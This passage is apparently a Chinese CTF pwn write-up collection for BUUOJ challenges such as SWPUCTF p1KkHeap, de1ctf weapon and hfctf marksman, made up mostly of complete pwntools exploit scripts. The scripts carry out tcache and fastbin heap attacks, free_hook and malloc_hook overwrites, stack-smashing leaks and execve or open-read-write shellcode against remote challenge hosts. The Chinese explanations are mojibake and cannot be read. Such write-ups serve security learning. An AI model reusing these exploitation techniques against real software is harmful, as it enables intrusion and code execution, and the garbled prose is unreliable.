add('chumen77','W',data) add('chumen77','W',data) free(0) show(0) r() libc_base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',libc_base) add('chumen77','W',data) add('chumen77','W',data) free_hook = 0x3c67a8 + libc_base data = '\\x00'* 8 + p64(0x71) + p64(free_hook-0x10) + '\\x01' * 0x58 edit(0,\"N\",data) data = p64(libc_base + 0x4526a) + 0x68 * '\\x00' edit(3,'N',data) free(0) itr() wdb_2018_guessåˆ†æä¸»è¦å°±æ˜¯åˆ©ç”¨stack smashingã€‚ stack smashingåŸç†åœ¨ç¨‹åºå¯åŠ¨ canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç° canary è¢«ä¿®æ”¹çš„è¯ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ __stack_chk_failå‡½æ•°æ¥æ‰“å° argv[0] æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ç¨‹åºåã€‚å…¶ä»£ç å¦‚ä¸‹ void __attribute__ ((noreturn)) __stack_chk_fail (void) &#123; __fortify_fail (\"stack smashing detected\"); &#125; void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\"); &#125; æ‰€ä»¥è¯´å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›– argv[0] ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨ fortify_fail å‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚ æ³¨æ„å…¶æ˜¯%sæ¥æ‰“å°ä¸œè¥¿çš„ï¼Œæ‰€ä»¥åœ¨åˆ©ç”¨æ—¶è¦ç”¨argv[0]åšä¸ªè·³æ¿ã€‚ å¦‚ä½•è·å–æ ˆå€¼https://blog.csdn.net/chennbnbnb/article/details/104035261 Libcä¸Šçš„_environå­˜æ”¾ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå…¶æ˜¯ä¸€ä¸ªæ ˆåœ°å€ã€‚ ä»¥æ­¤æ¥è·å–æ ˆå€¼ï¼Œç„¶åæ ¹æ®åç§»æ¥è®¿é—®æ ˆä¸­çš„æ•°æ®ã€‚ æ”»å‡»æ€è·¯ è·å–libcåŸºåœ°å€ è·å–stackåœ°å€ï¼Œæ ¹æ®åç§»æ‰¾åˆ°å­˜æ”¾flagçš„stack address è¦†ç›–argv[0]ä¸ºflagçš„stack address å…¶ä¸­æ¯æ¬¡éƒ½æ˜¯ç”¨gets è¦†ç›–åˆ°è¦†ç›–argv[0] ,stack smashingæ¥å®Œæˆã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './GUESS' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26813) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() data = '1' * 0x128 + p64(elf.got['__libc_start_main']) sla('flag',data) ru('hing detected ***: ') libc_base = uu64(r(6)) - 0x20740 info_addr('libc_base',libc_base) data = '1' * 0x128 + p64(libc.sym['_environ'] + libc_base) sla('flag',data) ru('hing detected ***: ') stack_flag = uu64(r(6)) - 0x168 info_addr('stack_base',stack_flag) data = '1' * 0x128 + p64(stack_flag) sla('flag',data) itr() suctf_2018_basic pwnæ— è„‘æ ˆæº¢å‡º #!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './SUCTF_2018_basic_pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25741) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() data = '1' * 0x118 + p64(0x000000401157) sl(data) itr() SWPUCTF_2019_p1KkHeapåˆ†æ å¼€äº†æ²™ç®±ï¼Œå¯ä»¥orwæ‹¿åˆ°flag åŠŸèƒ½åªèƒ½è°ƒç”¨18æ¬¡ï¼Œfreeåªèƒ½3æ¬¡ freeä¸­å­˜åœ¨uaf mmapäº†ä¸€å— rwxçš„å†…å­˜åœ¨ 0x66660000 æ”»å‡»æ€è·¯ æ³„æ¼heap baseï¼Œå‡†å¤‡æ”»å‡»tcache binçš„è¡¨å¤´ è¦†ç›–bin countsä¸º7ï¼Œä¼ªé€ æ»¡binï¼Œfree chunkï¼Œæ³„æ¼libc æ”»å‡»tcache binçš„è¡¨å¤´ä¸­bin chunk header çš„éƒ¨åˆ†ï¼Œæ”¾ä¸‹0x66660000 å’Œmalloc_hookï¼Œå‡†å¤‡ä¿®æ”¹è¿™ä¸¤ä¸ªéƒ¨åˆ†ã€‚ åœ¨0x66660000çš„å†…å­˜ä¸Šå†™ä¸‹orwçš„shellcode æ”»å‡»malloc_hookä¸º0x66660000 å–å¾—flag exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './SWPUCTF_2019_p1KkHeap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29911) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ''' ================================================================================ line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x07 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001 if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024 A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000 if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020 A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010 if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL ''' def add(size): sla('ice','1') sla('size',str(size)) def show(idx): sla('ice','2') sla('id',str(idx)) def edit(idx,data): sla('ice','3') sla('id',str(idx)) sa('tent',str(data)) def free(idx): sla('ice','4') sla('id',str(idx)) add(0x100) #0 free(0) free(0) show(0) ru('content: ') heap_base = uu64(r(6)) - 0x260 info_addr('heap_base',heap_base) add(0x100) #1 edit(1,p64(heap_base+0x10)) add(0x100) #2 add(0x100) #3 debug() data = p64(8) + '\\x07'*8 edit(3,data) add(0x80)#4 free(0) show(0) ru('content: ') libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc_base',libc_base) data = p64(8) + '\\x07'*8 + '\\x00' * (0xc0 - 0x20) + p64(0x3ebc30 + libc_base) +p64(0x66660000) edit(3,data) add(0x100) #5 orw = shellcraft.open('flag') orw += shellcraft.read(3,0x66660100,0x64) orw +=shellcraft.write(1,0x66660100,0x64) edit(5,asm(orw)) add(0xf0) #6 edit(6,p64(0x66660000)) add(1) itr() é¢˜è®°åœ¨å­¦ä¹ åˆ«äººçš„expæ—¶ï¼Œå‘ç°è¿˜æœ‰æ³„æ¼libcçš„å¦å¤–ä¸€ç§åŠæ³•ï¼Œè¿™ç§åŠæ³•æ³„æ¼å‡ºlibcï¼Œä¹Ÿä½¿å¾—æ•´ä¸ªexpï¼ŒåŸºæœ¬è·Ÿæˆ‘çš„ä¸å¤§ç›¸åŒã€‚ çŸ¥è¯†ç‚¹åœ¨tcache binçš„è¡¨å¤´ä¸­ï¼Œå…¶æ¯ä¸ªå¤§å°tcache binçš„count(0-7) æ˜¯ä¸€ä¸ªæ— ç¬¦å·ç±»å‹çš„æ•°æ®ã€‚ å½“ç”¨uafæ¼æ´ï¼Œåœ¨ä¸€ä¸ªchainä¸Šä¼ªé€ ä¸€ä¸ªchunkåœ°å€ï¼Œè¿™æ ·å½“ç”³è¯·åtcache binçš„countä¼šå˜æˆ0xff&gt;0x7ï¼Œè¿™æ ·åˆ©ç”¨uafï¼Œå†æ¬¡é‡Šæ”¾è¿™ä¸ªchainä¸Š çš„chunkï¼Œå°±ä¼šè¿›å…¥åˆ°unsortbinï¼Œæ¥ç€å°±leak å‡ºlibcäº†ã€‚ pwndbg&gt; parseheap addr prev size status fd bk 0x55daa2e85000 0x0 0x250 Used None None 0x55daa2e85250 0x0 0x110 Freed 0x7fb70dbbaca0 0x7fb70dbbaca0 0x55daa2e85360 0x110 0x110 Freed 0x55daa2e85370 None pwndbg&gt; x/30gx 0x55daa2e85000 0x55daa2e85000: 0x0000000000000000 0x0000000000000251 0x55daa2e85010: 0x0000000000000000 0xff00000000000000 0x55daa2e85020: 0x0000000000000000 0x0000000000000000 å‰©ä¸‹çš„å°±æ˜¯è¿›è¡Œtcache dupå³å¯ã€‚è¿™ä¸ªæ¯”æˆ‘é‚£ä¸ªæ–¹æ³•è¦ç®€å•çš„å¤šã€‚ å‚è€ƒé“¾æ¥https://blog.csdn.net/github_36788573/article/details/103475238 https://blog.csdn.net/seaaseesa/article/details/103450524 æŠ¤ç½‘æ¯_2018_gettingstartç™½ç»™é¢˜ã€‚è€ƒæµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­æ˜¯æ€ä¹ˆå­˜çš„ã€‚ data = '1' * 24 + p64(0x7fffffffffffffff) + p64(0x3FB999999999999A) s(data) itr() [OGeek2019]bookmanageråˆ†æ å­˜åœ¨heap overflow uaf off by one ä¸€å †æ´ï¼Œä¼ªä»£ç çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥è¾ƒä¸ºç®€å•ã€‚ é‡ç‚¹æ¼æ´å‡½æ•°åœ¨ updataä¸Šã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './pwn-2' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29005) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add_chapter(name): sla('choice','1') sa('name',str(name)) def add_section(chapter,name): sla('choice','2') sa('into',str(chapter)) sa('name',str(name)) def add_text(section,size,data): sla('choice','3') sa('into',str(section)) sla('write',str(size)) sa('Text',str(data)) def del_chapter(name): sla('choice','4') sla('name',str(name)) def del_section(name): sla('choice','5') sla('name',str(name)) def del_text(name): sla('choice','6') sla('name',str(name)) def show(): sla('choice','7') def edit(type,name,data): sla('choice','8') sla('update',str(type)) sa('name',str(name)) sa('New',str(data)) sla('Name','chumen77' * 4) add_chapter('chumen77') add_section('chumen77','1') add_section('chumen77','2') add_section('chumen77','3') add_text('1',0x100,'1'*0x100) # show() add_text('2',0x100,'2'*0x100) del_section('1') del_section('2') show() ru('Section:') libc_base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',libc_base) free_hook = 0x3c67a8 + libc_base add_text('3',0x100,'1'*0x100) edit('Section',3,'3' + '\\x00' + '1'*(0x20-2) + '\\xd0') data = p64(free_hook) + p64(0x20) edit('Text','3',data) one = libc_base + rce16[2] edit('Text','3',p64(one)) del_chapter('chumen77') # debug() itr() é¢˜è®° é¢˜æ˜¯ç®€å•é¢˜ï¼Œä½†æ˜¯ç”±äºä»£ç ä¸€å¤šï¼Œä¸”æŒ‡é’ˆçœ‹èµ·æ¥å¤æ‚ï¼Œä¸ªäººåšèµ·æ¥å°±æœ‰ç‚¹æ…¢ï¼Œå¹¶ä¸”è®©è‡ªå·±è¿æœ€ç®€å•çš„heap overflowéƒ½æ²¡æœ‰æƒ³èµ·æ¥å»åˆ©ç”¨ã€‚ è§£å†³åŠæ³• å¯¹äºæŒ‡é’ˆå¤æ‚çš„å †ä¿¡æ¯åˆ†é…ï¼Œå¯ä»¥ç›´æ¥gdbä¸Šæ‰‹è°ƒæ¥ç¡®å®šåŸºæœ¬å †ä¿¡æ¯ã€‚ de1ctf_2019_weaponåˆ†æ uaf æœ€å¤§åªèƒ½ç”³è¯·0x60çš„chunk æ²¡æœ‰showå‡½æ•° éƒ¨åˆ†inputåˆ©ç”¨scanfæ¥è·å–è¯»å…¥ æ”»å‡»æ€è·¯ free 2ä¸ªchunkï¼Œç„¶åç”¨scanf è¯»å…¥å¤§é‡çš„å­—ç¬¦ï¼Œæ¥è·å–ä¸€ä¸ªsmallbin åˆ©ç”¨æ®‹ç•™çš„libcåœ°å€ï¼Œfastbin attck IO_stdoutæ¥æ³„æ¼libc fastbin attck malloc_hook exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './de1ctf_2019_weapon' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',28987) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('ice','1') sla('size of weapon:',str(size)) sla('dex',str(idx)) sa('name',str(data)) def free(idx): sla('ice','2') sla('idx',str(idx)) def edit(idx,data): sla('ice','3') sla('idx',str(idx)) sa('new',str(data)) def leak_addr(): add(0,0x60,'1') add(1,0x60,'1') add(2,0x60,'1') add(3,0x60,'1') free(0) free(1) sla('ice','1' * 0x1000) add(4,0x60,p16(0xa5dd)) free(3) free(2) free(3) edit(3,'\\x00') add(5,0x60,'1') add(6,0x60,'1') # debug() data = '\\x00' * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) add(7,0x60,data) leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() # io = process('./de1ctf_2019_weapon') io = remote('node3.buuoj.cn',28987) continue info_addr('leak',leak) libc_addr = leak - 0x3c56a3 info_addr('libc_base',libc_addr) malloc_hook = 0x3c4b10 + libc_addr free(0) free(2) free(0) edit(0,p64(malloc_hook - 0x13)) add(7,0x60,'1') one = rce16[3] + libc_addr data = '\\x00' * 3 + p64(one) add(8,0x60,data) sla('ice','1') sla('size of weapon:','10') sla('dex','9') # add(9,0x30,'1') # debug() itr() starctf_2019_babyshellåˆ†æä¼šæœ‰ä¸€ä¸ªå‡½æ•°æ£€æŸ¥ä½ çš„shellcodeæ˜¯å¦æ»¡è¶³è¦æ±‚ã€‚ for ( i = a1; *i; ++i ) &#123; for ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j ) ; if ( !*j ) // æ£€æŸ¥shellcodeåˆæ³•çš„å‡½æ•°ï¼Œéå†shellcodeçš„æ¯ä¸ªå­—ç¬¦ï¼Œåœ¨0x400987å¤„æ‰¾æ˜¯å¦æœ‰åŒ¹é…ã€‚ return 0LL; &#125; return 1LL; éœ€è¦0x400987åœ°å€å¤„çš„å­—èŠ‚ç åŒ¹é…ã€‚å€˜è‹¥å‘ç°æœ‰ä¸åŒ¹é…çš„å­—èŠ‚ï¼Œå°±ç›´æ¥checkä¸è¿‡ã€‚ å¯ä»¥ç”¨çš„æœ‰ pop rdxã€pop rdiã€syscall æ–¹æ³•ä¸€æœ‰å¸ˆå‚…çš„åšæ³•ï¼Œå°±æ˜¯ç”¨è¿™3ä¸ªæ±‡ç¼–ï¼Œå¼ºè¡Œå‡‘å‡ºä¸€ä¸ªreadï¼Œç„¶åæŠŠshellcodeå†æ¬¡è¯»åˆ°mmapçš„bufä¸Šåˆé€‚çš„ä½ç½®ï¼ˆæ­¤é¢˜åŠ 12ï¼‰ï¼Œå†æ¬¡è°ƒç”¨åˆ°shellcodeã€‚ https://www.cnblogs.com/Rookle/p/12895895.htmlhttps://github.com/sixstars/starctf2019/tree/master/pwn-shellcodehttps://blog.csdn.net/seaaseesa/article/details/105863820 å¯¹äºä¸€äº›å—é™çš„shellcodeï¼Œæˆ‘ä»¬æœ€å¥½çš„åŠæ³•æ˜¯æ„é€ readç³»ç»Ÿè°ƒç”¨ã€‚ æ–¹æ³•äºŒè¿˜æœ‰å°±æ˜¯è¿™ä¸ªå¾ªç¯ï¼Œå…¶å®ç›´æ¥å¯ä»¥ç”¨\\x00æˆªæ–­ï¼Œå› ä¸ºå¼€å¤´å¾ªç¯æ¡ä»¶2 ç»™0 ç›´æ¥å°±ä¸æ‰§è¡Œä¸‹é¢çš„æ£€æµ‹å¾ªç¯ï¼Œreturn 1 èµ°äº†ã€‚ ä½†æ˜¯è·³è¿‡å»éœ€è¦ï¼Œæå‰å†å¸ƒç½®å‡ ä¸ªæœºå™¨ç å­—èŠ‚ä¿è¯ä¸å½±å“ä¸‹é¢çš„shellcodeã€‚ å¯ä»¥ç›´æ¥åœ¨idaé‡Œé¢è®¾ç½®æ˜¾ç¤ºæœºå™¨ç ï¼Œä»¥åç›´æ¥é€‰å–åˆé€‚çš„æœºå™¨ç æ•´ä¸Šå»å°±å¯ä»¥äº†ã€‚ 00 5A 5A add [rdx+5Ah], bl expshellcode = asm(shellcraft.sh()) s('\\x00'+ '\\x5a' +'\\x00'+ shellcode) é¢˜è®°æ„Ÿè§‰ä¸ªäººshellcodeèƒ½åŠ›è¾ƒå·®ï¼Œå¾—æŠ½æ—¶é—´å­¦ä¹ ä¸‹ã€‚ hfctf_2020_marksmanåˆ†æä¸Šæ¥ç»™äº†libcåœ°å€ï¼Œå¯ä»¥ä»»æ„åœ°å€3ä¸ªå­—èŠ‚çš„å†™å…¥ã€‚ éš¾ç‚¹1ä¿®æ”¹é‚£é‡Œçš„åœ°å€ï¼Œæ‰èƒ½æ§åˆ¶ç¨‹åºæµç¨‹ã€‚ å¯ä»¥ä¿®æ”¹exit_hook:https://blog.csdn.net/qq_43116977/article/details/105485947å‚è€ƒè¿™é‡Œã€‚ åœ¨é€€å‡ºæ—¶ï¼š exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive ä¿®æ”¹__rtld_lock_unlock_recursiveæˆ–è€…__rtld_lock_lock_recursiveå³å¯ã€‚ gdb å¿«é€Ÿè·å–è¿™ä¸ªåœ°å€çš„åŠæ³•ï¼š pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive éš¾ç‚¹2one gadgetçš„è°ƒæ•´ã€‚ å…¶ä¸­ one_gadget -lx è¿™ä¸ªå¯ä»¥è®¾ç½®æ‰«æç­‰çº§è·å–æ›´å¤šçš„one gadgetã€‚ å¹¶ä¸”åœ¨ç¨‹åºä¸­ï¼š signed __int64 __fastcall sub_BC2(_BYTE *a1) &#123; if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u ) return 1LL; puts(\"You always want a Gold Finger!\"); return 0LL; &#125; å¯¹å†™å…¥çš„åœ°å€ä¹Ÿç»™é™åˆ¶äº†ä¸èƒ½å‡ºç°è¿™å‡ ä¸ªå­—èŠ‚ã€‚å…¶ä¸­å°±è®©å¾ˆå¥½çš„: 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ä¸è®©å†™å…¥ä½¿ç”¨äº†ã€‚å…¶ä»–çš„å› ä¸ºåœ°å€å°ï¼Œçˆ†ç ´å·®è·å¤§ï¼Œæˆ–è€…é™åˆ¶æ¡ä»¶é«˜ï¼Œä¸é€‚åˆä½¿ç”¨ã€‚ æƒ³åŠæ³•è°ƒæ•´ä¸€ä¸‹ï¼Œæ¥å®ç°ä¸Šé¢è¿™ä¸ªone gadgetçš„ä½¿ç”¨ã€‚ http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90 å‚è€ƒ taqiniå¸ˆå‚…çš„è¿™ä¸ªæ–‡ç« ï¼Œå‘ç°å…¶ä¸­å°±æœ‰å¯¹è¿™ä¸ªçš„åˆ†æï¼Œå‘ç°æœ€é‡è¦çš„å°±æ˜¯ï¼šrsi rdi rdxè¦ç»™æ§åˆ¶å¥½ï¼Œå…¶ä¸­è¿™ä¸ªgadgeté™„è¿‘çš„æ±‡ç¼–å¦‚å›¾æ‰€ç¤º å…¶ä¸­8cç»“å°¾çš„æ±‡ç¼–ä¹‹åæ˜¯ä¸€å®šè¦æ‰§è¡Œçš„ï¼Œå…¶ä¸­å°±æ§åˆ¶äº†rsi rdi rdxã€‚å¹¶ä¸”8cè¿™æ¡æ±‡ç¼–ä¹Ÿæ˜¯ä¸å¯ä»¥è·³è¿‡ï¼Œæ§åˆ¶çš„raxï¼Œåœ¨è¿™ä¸ªone gadget ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¦åˆ™å½“åˆä½œè€…åœ¨å†™è¿™ä¸ªone gadgetæ€ä¹ˆæ²¡æœ‰è·³è¿‡ï¼Œç›´æ¥ä»93ç»“å°¾æ±‡ç¼–å¼€å§‹äº†ã€‚ å‘ä¸Šçœ‹æœ‰ä¸ªcallæŒ‡ä»¤ï¼Œè¿™æ˜¯å¯¹æ¥ä¸‹æ¥çš„one gadgetæ‰§è¡Œå¹¶æ— é€ æˆé‡è¦å‚æ•°å¤§çš„å½±å“çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å‘ä¸Šå†™ä¸€ä¸ªåœ°å€ï¼Œè®©è¿™ä¸ªgadgetä»0x10a387å¼€å§‹ã€‚ æ‰§è¡Œä¸‹å»å‘ç°æ˜¯å¯ä»¥æ»¡è¶³execve(&quot;/bin/sh&quot;, 0, environ)çš„ã€‚ æ­¤é¢˜ä¸­å¯¹äºexit hook çš„æ”¹å†™ä¸­ï¼Œ_dl_rtld_lock_recursive å¯ä»¥å®Œæˆæ¡ä»¶çš„æ»¡è¶³ã€‚_dl_rtld_unlock_recursiveä¸å¯ä»¥ã€‚å…·ä½“è·Ÿè¿‡å»ä¼šå‘ç°æ˜¯åœ¨ç¬¬2å’Œå‚æ•°å‡ºäº†é—®é¢˜ï¼Œä¸”åœ¨one gadgetä¸­ç¬¬äºŒä¸ªå‚æ•°çš„æ§åˆ¶å¾ˆç„å­¦ï¼Œä¸”å¾ˆéš¾æ§åˆ¶ï¼Œè®©äººå¤´å¤§ã€‚ expru('0x') libc_base = int(r(12),16) - libc.sym['puts'] info_addr('libc_base',libc_base) exit_hook = 0x81df60 + libc_base one = 0x10a387 + libc_base # debug() sl(str(exit_hook)) sla('biang',chr((one &amp;0xff))) sla('biang!',chr((one &gt;&gt; 8 &amp;0xff))) sla('biang!',chr((one &gt;&gt; 16 &amp;0xff))) itr() é¢˜è®°å¯¹äºä¿®æ”¹_dl_finiï¼Œåˆå‘ç°äº†ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒé“¾æ¥ï¼šhttps://bbs.pediy.com/thread-248495.htm#msg_header_h2_1 sctf_2019_easy_heapåˆ†æ å¼€å¤´mmap ä¸€æ®µå†…å­˜ rwx libc 2.27çš„off by null æ²¡æœ‰show æ”»å‡»æ€è·¯ å…ˆä¸Šæ¥ç”³è¯·ä¸€ä¸ª0x1000çš„å†…å­˜å—ï¼Œç„¶åé‡Šæ”¾ï¼Œå¯ä»¥ä¿è¯æ¯æ¬¡ç”³è¯·çš„å †å—ä¸Šéƒ½å­˜æœ‰libcä¿¡æ¯ï¼Œå‡†å¤‡æ”»å‡»åˆ©ç”¨ off by null ç•™å‡º 2ä¸ªé‡å çš„å †å— ä¸€ä¸ªæ”»å‡» mmapï¼Œå¦ä¸€ä¸ªæ”»å‡»malloc hook ç”±äºtcache åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆæ£€æŸ¥ï¼Œåˆ©ç”¨èµ·æ¥è¾ƒä¸ºå®¹æ˜“ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './sctf_2019_easy_heap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',28382) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla('&gt;&gt;','1') sla('ize',str(size)) def free(idx): sla('&gt;&gt;','2') sla('dex',str(idx)) def edit(idx,data): sla('&gt;&gt;','3') sla(\"dex\",str(idx)) sa('tent',str(data)) ru('0x') mmap = int(r(10),16) add(0x1000) add(0x10) #1 free(0) add(0x90) #0 add(0x28) #2 add(0x18) #3 add(0xf0) #4 for i in range(7): add(0x90) for i in range(7): free(i+5) add(0xf0) for i in range(7): free(i+5) free(0) edit(3,'\\x00' * 0x10 + p64(0xb0+0x40)) free(4) add(0x28) #0 add(0x28) #4 add(0x18) #5 add(0x10) #6 add(0x28) #7 add(0x18) #8 free(4) free(7) edit(2,'\\x60' + '\\n') edit(0,p64(mmap) + '\\n') add(0x28) #4 add(0x28) #7 add(0x28) #9 free(6) free(8) edit(3,'\\xc0' + '\\n') edit(5,p8(0x30) + '\\n') add(0x18) #6 add(0x18) #8 add(0x18) #10 shellcode = \"\"\" call here .ascii \"/bin/sh\" .byte 0 here: pop rdi xor rsi,rsi xor rdx,rdx mov rax,0x3b syscall \"\"\" edit(9,asm(shellcode) + '\\n') 